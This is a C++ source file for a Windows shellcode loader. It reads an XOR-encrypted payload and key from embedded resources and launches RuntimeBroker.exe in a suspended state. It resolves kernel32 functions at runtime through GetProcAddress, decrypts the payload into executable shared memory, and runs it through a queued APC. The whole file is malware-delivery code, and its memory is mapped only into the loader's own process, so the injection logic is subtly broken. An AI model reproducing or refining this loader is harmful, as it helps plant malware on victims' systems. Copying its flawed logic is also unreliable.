#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <random>
#include <cstdlib>
#include <ctime>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void its_load_re(const char* renamer, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    
    HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
    HGLOBAL resrdata = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(resrdata);
    
    std::cout << "Loaded resource: " << renamer << " Size: " << *size << std::endl;
}

int main() {
    
    char* ke;
    DWORD keLen;
    its_load_re("dhanushkey1", &ke, &keLen);
    std::cout << "Key loaded, size: " << keLen << std::endl;

    const char* processPath = "C:\\Windows\\System32\\RuntimeBroker.exe";
    char* code199k;
    DWORD code199kLen;
    its_load_re("dhanushcode56", &code199k, &code199kLen);
    std::cout << "Payload loaded, size: " << code199kLen << std::endl;

    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    
    si.cb = sizeof(si);
    
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (hKernel32 == NULL) {
        std::cerr << "Failed to load kernel32.dll" << std::endl;
        return -1;
    }
    std::cout << "Loaded kernel32.dll" << std::endl;
    
    // Create a new process in a suspended state
    auto pCreateProcessA = (BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))GetProcAddress(hKernel32, "CreateProcessA");
    if (pCreateProcessA == NULL) {
        std::cerr << "Failed to get address of CreateProcessA" << std::endl;
        return -1;
    }
    
    BOOL success = pCreateProcessA(processPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!success) {
        std::cerr << "Failed to create process" << std::endl;
        return -1;
    }
    std::cout << "Process created in suspended state" << std::endl;

    // Get the thread context
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    
    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "GetThreadContext");
    if (pGetThreadContext == NULL) {
        std::cerr << "Failed to get address of GetThreadContext" << std::endl;
        return -1;
    }
    
    success = pGetThreadContext(pi.hThread, &ctx);
    if (!success) {
        std::cerr << "Failed to get thread context" << std::endl;
        return -1;
    }
    std::cout << "Thread context retrieved" << std::endl;

    // Create a file mapping (shared memory)
    auto pCreateFileMappingA = (HANDLE(WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))GetProcAddress(hKernel32, "CreateFileMappingA");
    if (pCreateFileMappingA == NULL) {
        std::cerr << "Failed to get address of CreateFileMappingA" << std::endl;
        return -1;
    }

    HANDLE hMapFile = pCreateFileMappingA(
        INVALID_HANDLE_VALUE,  // Use system paging file
        NULL,                  // Default security
        PAGE_EXECUTE_READWRITE, // Read/Write access
        0,                     // Maximum object size (high-order DWORD)
        code199kLen,           // Maximum object size (low-order DWORD)
        NULL                   // Name of the mapping object
    );

    if (hMapFile == NULL) {
        std::cerr << "Failed to create file mapping" << std::endl;
        return -1;
    }
    std::cout << "File mapping created" << std::endl;

    // Map the view of the file into the process's memory space
    auto pMapViewOfFile = (LPVOID(WINAPI*)(HANDLE, DWORD, DWORD, DWORD, SIZE_T))GetProcAddress(hKernel32, "MapViewOfFile");
    if (pMapViewOfFile == NULL) {
        std::cerr << "Failed to get address of MapViewOfFile" << std::endl;
        return -1;
    }
    
    LPVOID lpBase = pMapViewOfFile(
        hMapFile,              // Handle to the mapping object
        FILE_MAP_ALL_ACCESS,   // Read/Write access
        0,                     // High-order DWORD of the file offset
        0,                     // Low-order DWORD of the file offset
        code199kLen            // Number of bytes to map
    );

    if (lpBase == NULL) {
        std::cerr << "Failed to map view of file" << std::endl;
        return -1;
    }
    std::cout << "Memory view mapped" << std::endl;

    // XOR payload with key
    std::cout << "Starting XOR operation..." << std::endl;
    for (DWORD i = 0; i < code199kLen; i++) {
        code199k[i] ^= ke[i % keLen];
    }
    std::cout << "XOR operation completed" << std::endl;

    // Copy the modified payload to the mapped memory
    memcpy(lpBase, code199k, code199kLen);
    std::cout << "Payload copied to mapped memory" << std::endl;

    // Set the thread context with the new RCX value
    ctx.Rcx = (DWORD64)lpBase;
    
    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "SetThreadContext");
    if (pSetThreadContext == NULL) {
        std::cerr << "Failed to get address of SetThreadContext" << std::endl;
        return -1;
    }
    
    success = pSetThreadContext(pi.hThread, &ctx);
    if (!success) {
        std::cerr << "Failed to set thread context" << std::endl;
        return -1;
    }
    std::cout << "Thread context set" << std::endl;

    // Queue the APC to run the payload
    auto pQueueUserAPC = (BOOL(WINAPI*)(PAPCFUNC, HANDLE, DWORD))GetProcAddress(hKernel32, "QueueUserAPC");
    if (pQueueUserAPC == NULL) {
        std::cerr << "Failed to get address of QueueUserAPC" << std::endl;
        return -1;
    }

    success = pQueueUserAPC((PAPCFUNC)lpBase, pi.hThread, 0);
    if (!success) {
        std::cerr << "Failed to queue APC" << std::endl;
        return -1;
    }
    std::cout << "APC queued" << std::endl;

    // Resume the thread to execute the code
    auto pResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddress(hKernel32, "ResumeThread");
    if (pResumeThread == NULL) {
        std::cerr << "Failed to get address of ResumeThread" << std::endl;
        return -1;
    }

    success = pResumeThread(pi.hThread);
    if (success == (DWORD)-1) {
        std::cerr << "Failed to resume thread" << std::endl;
        return -1;
    }
    std::cout << "Thread resumed" << std::endl;

    return 0;
}
